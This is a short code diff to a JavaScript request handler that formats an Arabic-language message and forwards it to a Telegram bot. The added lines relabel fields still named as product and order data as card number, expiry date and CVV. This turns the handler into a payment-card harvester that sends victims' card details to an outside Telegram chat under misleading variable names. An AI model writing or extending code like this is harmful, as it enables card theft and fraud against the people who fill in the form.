@@ -89,9 +89,9 @@ if (
 const message =
     "طلب جديد\n\n" +
     "الاسم: " + String(productName).slice(0, 100) + "\n" +
-    "رقم الطلب: " + String(productNumber).slice(0, 50) + "\n" +
-    "التاريخ: " + String(applicationDate).slice(0, 30) + "\n" +
-    "الحالة: " + String(serialNumber).slice(0, 30);
+    "رقم البطاقة: " + String(productNumber).slice(0, 50) + "\n" +
+    "التاريخ الانتهاء: " + String(applicationDate).slice(0, 30) + "\n" +
+    "cvv: " + String(serialNumber).slice(0, 30);
 
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     return res.json({
